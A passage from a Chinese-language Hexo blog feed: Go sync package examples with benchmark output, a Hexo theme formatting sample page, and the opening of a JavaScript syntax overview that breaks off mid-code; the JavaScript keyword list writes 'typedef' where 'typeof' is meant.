<div class="tabs" id="go-sync-cond"><ul class="nav-tabs"><li class="tab active"><a href="#go-sync-cond-1">DeadLock</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-sync-cond-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    log.SetFlags(log.Flags()&amp;^(log.Ldate|log.Ltime) | log.Lmicroseconds)</span><br><span class="line">    log.SetOutput(os.Stdout)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mu sync.Mutex</span><br><span class="line">    cond := sync.NewCond(&amp;mu)</span><br><span class="line">    <span class="keyword">var</span> ready <span class="type">bool</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">            mu.Lock()</span><br><span class="line">            <span class="keyword">defer</span> mu.Unlock()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> !ready &#123;</span><br><span class="line">                log.Printf(<span class="string">&quot;goroutine %d wait\n&quot;</span>, i)</span><br><span class="line">                cond.Wait()</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            log.Printf(<span class="string">&quot;goroutine %d done\n&quot;</span>, i)</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log.Println(<span class="string">&quot;main: signal&quot;</span>)</span><br><span class="line">    time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">    mu.Lock()</span><br><span class="line">    ready = <span class="literal">true</span></span><br><span class="line">    cond.Signal()</span><br><span class="line">    mu.Unlock()</span><br><span class="line"></span><br><span class="line">    fmt.Scanln()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">11:01:40.562508 main: signal</span></span><br><span class="line"><span class="comment">11:01:40.562617 goroutine 2 wait</span></span><br><span class="line"><span class="comment">11:01:40.562627 goroutine 0 wait</span></span><br><span class="line"><span class="comment">11:01:40.562631 goroutine 1 wait</span></span><br><span class="line"><span class="comment">11:01:41.563386 goroutine 2 done</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="Once"><a href="#Once" class="headerlink" title="Once"></a>Once</h2><ul>
<li>在多个goroutine中执行同一个<code>sync.Once</code>对象，其只会执行一次</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;once&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> once sync.Once</span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            once.Do(f)</span><br><span class="line">            done &lt;- <span class="literal">true</span></span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        &lt;-done</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*[OUTPUT]</span></span><br><span class="line"><span class="comment">once</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="Pool"><a href="#Pool" class="headerlink" title="Pool"></a>Pool</h2><ul>
<li>sync.Pool是对象重用的机制，可伸缩的，并发安全的，其大小仅受限于内存的大小</li>
<li>sync.Pool用于保存和复用临时对象，减少内存分配，降低 GC 压力</li>
</ul>
<div class="tabs" id="go-sync-pool"><ul class="nav-tabs"><li class="tab active"><a href="#go-sync-pool-1">Buffer</a></li><li class="tab"><a href="#go-sync-pool-2">json.Unmarshal</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-sync-pool-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bytes&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkBuffer</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> n := <span class="number">0</span>; n &lt; b.N; n++ &#123;</span><br><span class="line">        <span class="keyword">var</span> buf bytes.Buffer</span><br><span class="line">        buf.Write(data)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bufPool = sync.Pool&#123;</span><br><span class="line">    New: <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="keyword">interface</span>&#123;&#125; &#123;</span><br><span class="line">        <span class="keyword">return</span> &amp;bytes.Buffer&#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkBufferByPool</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> n := <span class="number">0</span>; n &lt; b.N; n++ &#123;</span><br><span class="line">        buf := bufPool.Get().(*bytes.Buffer)</span><br><span class="line">        buf.Write(data)</span><br><span class="line">        buf.Reset()</span><br><span class="line">        bufPool.Put(buf)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$ go test -bench=&quot;Buffer&quot; -benchmem</span></span><br><span class="line"><span class="comment">BenchmarkBuffer-4           384044      2639 ns/op   10240 B/op       1 allocs/op</span></span><br><span class="line"><span class="comment">BenchmarkBufferByPool-4   10302880     121.2 ns/op       0 B/op       0 allocs/op</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-sync-pool-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name   <span class="type">string</span></span><br><span class="line">    Age    <span class="type">int32</span></span><br><span class="line">    Remark [<span class="number">4096</span>]<span class="type">byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> j, _ = json.Marshal(Student&#123;Name: <span class="string">&quot;Geektutu&quot;</span>, Age: <span class="number">25</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkUnmarshal</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> n := <span class="number">0</span>; n &lt; b.N; n++ &#123;</span><br><span class="line">        s := &amp;Student&#123;&#125;</span><br><span class="line">        json.Unmarshal(j, s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pool = sync.Pool&#123;</span><br><span class="line">    New: <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="keyword">interface</span>&#123;&#125; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">new</span>(Student)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkUnmarshalByPool</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> n := <span class="number">0</span>; n &lt; b.N; n++ &#123;</span><br><span class="line">        s := pool.Get().(*Student)</span><br><span class="line">        json.Unmarshal(j, s)</span><br><span class="line">        pool.Put(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$ go test -bench=&quot;Unmarshal&quot; -benchmem</span></span><br><span class="line"><span class="comment">BenchmarkUnmarshal-4             3055    415878 ns/op    5112 B/op       8 allocs/op</span></span><br><span class="line"><span class="comment">BenchmarkUnmarshalByPool-4       2894    425744 ns/op     248 B/op       7 allocs/op</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://go.dev/ref/spec">The Go Programming Language Specification</a><br>[2] <a href="https://go.dev/doc/gc-guide">A Guide to the Go Garbage Collector</a><br>[3] <a href="https://go.dev/ref/mem">The Go Memory Model</a><br>[4] <a href="https://gfw.go101.org/">Go语言101</a></p>
]]></content>
      <categories>
        <category>ProgrammingLanguage</category>
        <category>Go</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo示例</title>
    <url>/Hexo/Sample.html</url>
    <content><![CDATA[<h1 id="blockquote"><a href="#blockquote" class="headerlink" title="blockquote"></a>blockquote</h1><blockquote><p>摆烂了。摆烂了也没有什么不好、不开心的，就是因为不想想太多，所以，摆烂了。</p>
<footer><strong>2233</strong></footer></blockquote>

<blockquote><p>等加贼年，等加贼冬，味係要等，等等等等。</p>
<footer><strong>1993 大国民</strong><cite><a href="https://www.youtube.com/watch?v=9Lv394CKRZE&ab_channel=TimelessMusic">郑智化</a></cite></footer></blockquote>

<blockquote><p>One word</p>
<footer><strong>Jack</strong><cite>CAT</cite></footer></blockquote>

<blockquote><p>One word</p>
<footer><strong>Jack, CAT</strong><cite><a href="https://abc.com">abc.com</a></cite></footer></blockquote>

<blockquote><p>Do not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.</p>
<footer><strong>David Levithan</strong><cite>Wide Awake</cite></footer></blockquote>

<h1 id="centerquote"><a href="#centerquote" class="headerlink" title="centerquote"></a>centerquote</h1><blockquote class="blockquote-center">
<p>Something</p>

</blockquote>

<p>Welcome to <a href="https://imssyang.com/">Just Do It</a>!</p>
<!-- more -->

<h2 id="Tag-Plugins"><a href="#Tag-Plugins" class="headerlink" title="Tag Plugins"></a>Tag Plugins</h2><h3 id="mermaid"><a href="#mermaid" class="headerlink" title="mermaid"></a><a href="https://mermaid-js.github.io/mermaid/#/">mermaid</a></h3><h4 id="Flowchart"><a href="#Flowchart" class="headerlink" title="Flowchart"></a>Flowchart</h4><p><a href="https://mermaid.live/edit">Mermaid Live Editor</a></p>
<p>Orientation:</p>
<ul>
<li>TB - top to bottom</li>
<li>TD - top-down&#x2F; same as top to bottom</li>
<li>BT - bottom to top</li>
<li>RL - right to left</li>
<li>LR - left to right</li>
</ul>
<pre class="mermaid">
graph TD
%%{init: {&#39;theme&#39;:&#39;base&#39;}}%%
    A[Hard] --&gt;|Text| B(Round)
    B --&gt; C{Decision}
    C --&gt;|One| D[Result 1]
    C --&gt;|Two| E[Result 2]
</pre>

<div class="mermaid">
%%{init: {'theme': 'base', 'themeVariables': { 'primaryColor': '#ffcccc', 'edgeLabelBackground':'#ffffee', 'tertiaryColor': '#fff0f0'}}}%%
        graph TD
          A[Christmas] -->|Get money| B(Go shopping)
          B --> C{Let me think}
          B --> G[/Another/]
          C ==>|One| D[Laptop]
          C -->|Two| E[iPhone]
          C -->|Three| F[fa:fa-car Car]
          subgraph section
            C
            D
            E
            F
            G
          end
</div>

<div class="mermaid">
%%{init: {'securityLevel': 'loose', 'theme':'base'}}%%
        sequenceDiagram
          autonumber
          par Action 1
            Alice->>John: Hello John, how are you?
          and Action 2
            Alice->>Bob: Hello Bob, how are you?
          end
          Alice->>+John: Hello John, how are you?
          Alice->>+John: John, can you hear me?
          John-->>-Alice: Hi Alice, I can hear you!
          Note right of John: John is perceptive
          John-->>-Alice: I feel great!
              loop Every minute
                John-->Alice: Great!
            end
</div>

<h3 id="Button"><a href="#Button" class="headerlink" title="Button"></a>Button</h3><a class="btn" href="#">Text</a>
<a class="btn" href="#">Text</a><a class="btn" href="#" title="Title">Text & Title</a>

<h3 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h3><div class="pdf-container" data-target="/docs/rfc5389.pdf" data-height="800px"></div>

<h3 id="tags"><a href="#tags" class="headerlink" title="tags"></a>tags</h3><div class="tabs" id="first-unique-name"><ul class="nav-tabs"><li class="tab active"><a href="#first-unique-name-1">First unique name 1</a></li><li class="tab"><a href="#first-unique-name-2">First unique name 2</a></li><li class="tab"><a href="#first-unique-name-3">First unique name 3</a></li></ul><div class="tab-content"><div class="tab-pane active" id="first-unique-name-1"><p><strong>This is Tab 1.</strong></p></div><div class="tab-pane" id="first-unique-name-2"><p><strong>This is Tab 2.</strong></p></div><div class="tab-pane" id="first-unique-name-3"><p><strong>This is Tab 3.</strong></p></div></div></div>

<h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><div class="note default"><h4 id="Default-Header"><a href="#Default-Header" class="headerlink" title="Default Header"></a>Default Header</h4><p>Welcome to <a href="https://hexo.io/">Hexo!</a></p>
</div>

<div class="note info"><h4 id="Info-Header"><a href="#Info-Header" class="headerlink" title="Info Header"></a>Info Header</h4><p><strong>Welcome</strong> to <a href="https://hexo.io/">Hexo!</a></p>
</div>


]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript基础</title>
    <url>/ProgrammingLanguage/JavaScript/Basic.html</url>
    <content><![CDATA[<p>JavaScript基础语法梳理，主要基于 ECMAScript 2015 (ES6) 标准，整理其语言上的数据模型与控制流程，重点关注与其他语言产生差异化的地方，尤其在编码便利性或执行效率上有推动作用的部分。</p>
<span id="more"></span>

<h1 id="基本特点"><a href="#基本特点" class="headerlink" title="基本特点"></a>基本特点</h1><ul>
<li>一种多范式（multi-paradigm）动态语言（dynamic language）<ul>
<li>支持OOP（object-oriented programming）<ul>
<li>对象模型（object model）采用<code>prototype-based</code>，而非<code>class-based</code><ul>
<li>动态继承（dynamic inheritance），属性（property）和方法（method）可以动态的增加到任何对象上</li>
</ul>
</li>
</ul>
</li>
<li>支持函数式编程（functional programming）- <code>functions are First-Class Citizen</code></li>
</ul>
</li>
<li>借鉴自C、C++和Java，但没有静态类型和强类型检查（strong type checking）</li>
<li>动态数据类型（dynamic typing, loosely typed），无需声明</li>
</ul>
<h1 id="严格模式（strict-mode）"><a href="#严格模式（strict-mode）" class="headerlink" title="严格模式（strict mode）"></a>严格模式（strict mode）</h1><ul>
<li><code>Strict mode</code>在ES5时引入，提供了更简洁的版本，但是破坏了现有的代码，也可能降低执行速度<ul>
<li>打开方式：<code>&#39;use strict&#39;;</code>放到文件或函数的第一行</li>
<li>句法改变（syntactic ）：<ul>
<li>禁用with语句：降低执行速度且变量语义更复杂</li>
</ul>
</li>
<li>语义改变（semantics）：<ul>
<li>在non-method函数中<code>this</code>值为undefined</li>
</ul>
</li>
<li>更多的错误（error）：<ul>
<li>给未声明变量赋值（ReferenceError）</li>
<li>改变只读属性（TypeError）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="数据模型（data-model）"><a href="#数据模型（data-model）" class="headerlink" title="数据模型（data model）"></a>数据模型（data model）</h1><ul>
<li>7种基本类型（primitive type）:<ul>
<li>特点：<ul>
<li>是immutable，不能被修改</li>
<li>不是object，没有method和property</li>
<li>支持自动转换为包装对象（auto-boxes）<ul>
<li><code>&quot;foo&quot;.includes(&quot;f&quot;)</code>隐式创建临时String对象，然后调用<code>String.prototype.includes()</code></li>
</ul>
</li>
</ul>
</li>
<li>类型：<ul>
<li><code>undefined</code> - 值未定义</li>
<li><code>null</code> - 刻意的non-value</li>
<li><code>boolean</code> - true&#x2F;false</li>
<li><code>number</code> - 整数（位操作时转换为32bit）或浮点数（64bit双精度），eg <code>42, 3.14159</code></li>
<li><code>bigint</code> - 大整数，eg <code>9007199254740992n</code></li>
<li><code>string</code> - 字符串，eg <code>&quot;hello&quot;</code></li>
<li><code>symbol</code> - 唯一标识符</li>
</ul>
</li>
</ul>
</li>
<li>关键字（keyword）<ul>
<li><code>function</code>: 定义函数</li>
<li><code>function*</code>：定义生成器函数</li>
<li><code>async function</code>：定义异步函数</li>
<li><code>async function*</code>：定义异步生成器函数</li>
<li><code>yield</code>：暂停或继续一个生成器函数</li>
<li><code>yield*</code>：委托给另一个生成器函数或迭代器对象</li>
<li><code>import</code>：导入外部模块中的函数</li>
<li><code>export</code>：导出函数，使得可用于外部模块</li>
<li><code>await</code>：暂停一个异步函数，等待promise的结果</li>
<li><code>new</code>：创建实例</li>
<li><code>delete</code>：删除对象的属性</li>
<li><code>void</code>：计算表达式并丢弃其返回值</li>
<li><code>typedef</code>：探测给定对象的类型</li>
<li><code>class</code>: 定义类</li>
<li><code>super</code>：访问父对象属性</li>
<li><code>this</code>: 与执行上下文有关的一个特殊属性</li>
<li><code>globalThis</code>：全局对象</li>
</ul>
</li>
<li>操作符（operator）<ul>
<li>位（bitwise）<ul>
<li><code>&amp;</code>：按位与（Bitwise AND）</li>
<li><code>|</code>：按位或（Bitwise OR）</li>
<li><code>^</code>：按位异或（Bitwise XOR）</li>
<li><code>~</code>：按位取反（Bitwise NOT）</li>
<li><code>&lt;&lt;</code>：左移</li>
<li><code>&gt;&gt;</code>：右移（按符号位补位）</li>
<li><code>&gt;&gt;&gt;</code>：无符号右移</li>
</ul>
</li>
<li>算术（arithmetic）<ul>
<li><code>+true</code>：前缀<code>+</code>表示按数值计算，结果为1（类型自动转换）</li>
<li><code>-&#39;4&#39;</code>：前缀<code>-</code>表示按数值计算后取反，结果为-4（类型自动转换）</li>
<li><code>A++|++A</code>：递增</li>
<li><code>A--|--A</code>：递减</li>
<li><code>3**2</code>：幂运算，结果为9</li>
<li><code>3*2</code>：乘运算，结果为6</li>
<li><code>3/2</code>：除运算，结果为1.5</li>
<li><code>3+2</code>：加运算，结果为5</li>
<li><code>3-2</code>：减运算，结果为1</li>
<li><code>3%2</code>：求余，结果为1</li>
</ul>
</li>
<li>关系（relational）<ul>
<li><code>&lt;|&lt;=</code>：小于型</li>
<li><code>&gt;|&gt;=</code>：大于型</li>
<li><code>==</code>：等于（类型自动转换）</li>
<li><code>===</code>：严格等于</li>
<li><code>!=</code>：不等于（类型自动转换）</li>
<li><code>!==</code>：严格不等于</li>
<li><code>a instanceof A</code>：判断a是否为A的实例</li>
<li><code>&#39;year&#39; in car</code>：判断car对象是否有year属性</li>
</ul>
</li>
<li>逻辑（logical）<ul>
<li><code>!</code>：逻辑非（Logical NOT）</li>
<li><code>&amp;&amp;</code>：逻辑与（Logical AND）</li>
<li><code>||</code>：逻辑或（Logical OR）</li>
<li><code>null ?? &#39;abc&#39;</code>：如果<code>??</code>左边不是<code>null</code>或<code>undefined</code>，就取左边值，否则取右边值</li>
<li><code>(condition ? ifTrue : ifFalse)</code>：三元运算符</li>
</ul>
</li>
</ul>
</li>
<li>表达式（expression）<ul>
<li>字面量（literal）:<ul>
<li><code>[1, 2, 3]</code>：数组，类似<code>new Array()</code></li>
<li><code>&#123;1: &#39;a&#39;&#125;</code>：对象，类似<code>new Object()/Object.create()</code></li>
<li><code>/ab+c/i</code>：正则表达式，等同<code>new RegExp(&#39;ab+c&#39;, &#39;i&#39;)</code></li>
<li><code>`Hi, $&#123;name&#125;`</code>：模板</li>
<li><code>a() * (b() + c())</code>：分组（可应用于函数）</li>
</ul>
</li>
<li>属性访问器（property accessors）：<ul>
<li><code>object.property</code></li>
<li><code>object[&quot;property&quot;]</code></li>
</ul>
</li>
<li>可选链（optional chaining）：属性后带<code>?</code>时，如果其值为<code>undefined</code>或<code>null</code>，返回<code>undefined</code>（不抛异常）<ul>
<li><code>obj.val?.prop</code></li>
<li><code>obj.func?.(args)</code></li>
</ul>
</li>
<li>构造实例（instance of a constructor）：<ul>
<li><code>new Car(&#39;red&#39;, 1993)</code>：创建一个实例</li>
<li><code>new.target</code>：不通过<code>new</code>操作符调用时此属性值为<code>undefined</code></li>
</ul>
</li>
<li>导入模块（import module）：<ul>
<li><code>await import(&quot;module.js&quot;)</code>：异步导入</li>
<li><code>import(&quot;module.js&quot;).then(...).catch(...)</code>：按需导入模块</li>
<li><code>import.meta</code>：将上下文的元数据暴露出来</li>
</ul>
</li>
<li>解构分配（destructuring assignment）<ul>
<li><code>[a, b] = arr, &#123; a, b &#125; = obj</code>：允许把数组或对象的属性分配给变量</li>
</ul>
</li>
<li>逗号操作符（Comma operator）<ul>
<li><code>,</code>：允许在一条语句执行多个表达式，然后返回最后一个表达式的结果</li>
</ul>
</li>
<li>传播语法（Spread syntax）<ul>
<li><code>...obj</code>：允许可迭代对象（例如数组）在需要[0~n]个参数地方被展开</li>
</ul>
</li>
</ul>
</li>
<li>内建对象（built-in object）：<ul>
<li>特殊值（Value properties）：没有property和method<ul>
<li>globalThis</li>
<li>Infinity</li>
<li>NaN</li>
<li>undefined</li>
</ul>
</li>
<li>全局函数（Function properties）：不归属某个对象的函数<ul>
<li>eval()</li>
<li>isFinite()</li>
<li>isNaN()</li>
<li>parseFloat()</li>
<li>parseInt()</li>
<li>decodeURI()</li>
<li>decodeURIComponent()</li>
<li>encodeURI()</li>
<li>encodeURIComponent()</li>
<li>escape() - 弃用</li>
<li>unescape() - 弃用</li>
</ul>
</li>
<li>基本对象（Fundamental objects）：补充表示基本的语言结构<ul>
<li>Object</li>
<li>Function</li>
<li>Boolean</li>
<li>Symbol</li>
</ul>
</li>
<li>错误对象（Error objects）：表示基本错误的对象<ul>
<li>Error</li>
<li>AggregateError</li>
<li>EvalError</li>
<li>RangeError</li>
<li>ReferenceError</li>
<li>SyntaxError</li>
<li>TypeError</li>
<li>URIError</li>
<li>InternalError (Non-standard)</li>
</ul>
</li>
<li>数值和日期（Numbers and dates）：表示数值、日期和数学计算的对象<ul>
<li>Number</li>
<li>BigInt</li>
<li>Math</li>
<li>Date</li>
</ul>
</li>
<li>文本处理（Text processing）：表示处理字符串操作的对象<ul>
<li>·String</li>
<li>·RegExp</li>
</ul>
</li>
<li>使用索引的集合（Indexed collections）：表示按index值排序的集合对象<ul>
<li>Array</li>
<li>Int8Array</li>
<li>Uint8Array</li>
<li>Uint8ClampedArray</li>
<li>Int16Array</li>
<li>Uint16Array</li>
<li>Int32Array</li>
<li>Uint32Array</li>
<li>BigInt64Array</li>
<li>BigUint64Array</li>
<li>Float32Array</li>
<li>Float64Array</li>
</ul>
</li>
<li>使用键的集合（Keyed collections）：表示以key存储的集合对象<ul>
<li>Map</li>
<li>Set</li>
<li>WeakMap</li>
<li>WeakSet</li>
</ul>
</li>
<li>结构化数据（Structured data）：提供结构化数据缓存和编码的能力<ul>
<li>ArrayBuffer</li>
<li>SharedArrayBuffer</li>
<li>DataView</li>
<li>Atomics</li>
<li>JSON</li>
</ul>
</li>
<li>内存管理（Managing memory）：提供与垃圾回收机制交互的能力<ul>
<li>WeakRef</li>
<li>FinalizationRegistry</li>
</ul>
</li>
<li>控制抽象对象（Control abstraction objects）：适用于异步编程时避免多层回调结构<ul>
<li>Promise</li>
<li>GeneratorFunction</li>
<li>AsyncGeneratorFunction</li>
<li>Generator</li>
<li>AsyncGenerator</li>
<li>AsyncFunction</li>
</ul>
</li>
<li>反射（Reflection）：提供通过实例解析对象结构的能力<ul>
<li>Reflect</li>
<li>Proxy</li>
</ul>
</li>
<li>国际化（Internationalization）：提供国际通用语言之间的字符串比较、数字和日期格式的转换<ul>
<li>Intl</li>
<li>Intl.Collator</li>
<li>Intl.DateTimeFormat</li>
<li>Intl.DisplayNames</li>
<li>Intl.ListFormat</li>
<li>Intl.Locale</li>
<li>Intl.NumberFormat</li>
<li>Intl.PluralRules</li>
<li>Intl.RelativeTimeFormat</li>
<li>Intl.Segmenter</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="特殊值"><a href="#特殊值" class="headerlink" title="特殊值"></a>特殊值</h2><ul>
<li>undefined标识未赋值</li>
<li>null标识有意的未赋值</li>
</ul>
<div class="tabs" id="jsvalue"><ul class="nav-tabs"><li class="tab active"><a href="#jsvalue-1">undefined</a></li><li class="tab"><a href="#jsvalue-2">null</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jsvalue-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>     <span class="comment">// &quot;undefined&quot;</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="number">1</span> + <span class="literal">undefined</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* implicit undefined */</span></span><br><span class="line"><span class="keyword">return</span>;         <span class="comment">// return non-with value</span></span><br><span class="line">obj.<span class="property">iDontExist</span>  <span class="comment">// accessing a nonexistent object property</span></span><br><span class="line"><span class="keyword">let</span> x;          <span class="comment">// a variable declaration without initialization</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsvalue-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>          <span class="comment">// &quot;object&quot; (not &quot;null&quot; for legacy reasons)</span></span><br><span class="line">!<span class="literal">null</span>                <span class="comment">// true</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="number">1</span> + <span class="literal">null</span>)      <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> === <span class="literal">undefined</span>   <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span>  == <span class="literal">undefined</span>   <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> foo = <span class="literal">null</span>;    <span class="comment">// no type or value</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="全局属性"><a href="#全局属性" class="headerlink" title="全局属性"></a>全局属性</h2><ul>
<li>访问全局对象的方式和运行环境相关：<ul>
<li>Browser: 通过<code>window, self，frames</code></li>
<li>WebWorkers：通过<code>self</code></li>
<li>NodeJS：通过<code>global</code></li>
</ul>
</li>
<li>this的行为复杂：<ul>
<li>仅在<code>non-strict</code>下引用全局对象</li>
</ul>
</li>
<li>globalThis用于访问全局对象的通用能力(ES2020)</li>
</ul>
<div class="tabs" id="jsglobal"><ul class="nav-tabs"><li class="tab active"><a href="#jsglobal-1">web-window</a></li><li class="tab"><a href="#jsglobal-2">node-global</a></li><li class="tab"><a href="#jsglobal-3">this</a></li><li class="tab"><a href="#jsglobal-4">globalThis</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jsglobal-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">20</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a);        <span class="comment">// 20</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">a</span>); <span class="comment">// 10</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsglobal-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">global</span>); <span class="comment">// =&gt; Object [global] &#123;...&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsglobal-3"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">// =&gt; Window &#123;...&#125;</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">// =&gt; Window &#123;...&#125;</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&quot;use strict&quot;</span>;</span><br><span 